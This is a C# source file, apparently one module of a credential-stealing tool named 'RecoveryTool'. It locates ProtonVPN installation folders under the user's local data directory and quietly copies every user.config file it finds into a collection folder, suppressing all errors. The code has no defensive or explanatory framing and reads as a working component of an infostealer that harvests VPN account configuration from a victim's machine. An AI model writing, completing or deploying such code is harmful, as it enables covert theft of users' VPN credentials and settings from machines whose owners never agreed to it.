using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.VPNs
{
    class ProtonVPNService
    {
        public static async Task SaveProtonVPNAsync()
        {
            try
            {
                string localDataDir = Common.LocalData;
                string protonVPNDir = Path.Combine(localDataDir, "ProtonVPN");

                if (Directory.Exists(protonVPNDir))
                {
                    foreach (string dir in Directory.GetDirectories(protonVPNDir))
                    {
                        if (dir.StartsWith(Path.Combine(protonVPNDir, "ProtonVPN.exe")))
                        {
                            await ProcessProtonVPNDirectories(dir);
                        }
                    }
                }
            }
            catch { }
        }

        private static async Task ProcessProtonVPNDirectories(string dir)
        {
            string[] subDirs = Directory.GetDirectories(dir);
            foreach (string subDir in subDirs)
            {
                string userConfigPath = Path.Combine(subDir, "user.config");
                if (File.Exists(userConfigPath))
                {
                    string protonVPNPath = Common.EnsureProtonVPNPath();
                    string destinationDir = Path.Combine(protonVPNPath, dir.GetHashCode().ToString(), subDir.GetHashCode().ToString());
                    string destinationPath = Path.Combine(destinationDir, "user.config");
                    await Task.Run(() => File.Copy(userConfigPath, destinationPath, overwrite: true));
                }
            }
        }
    }
}
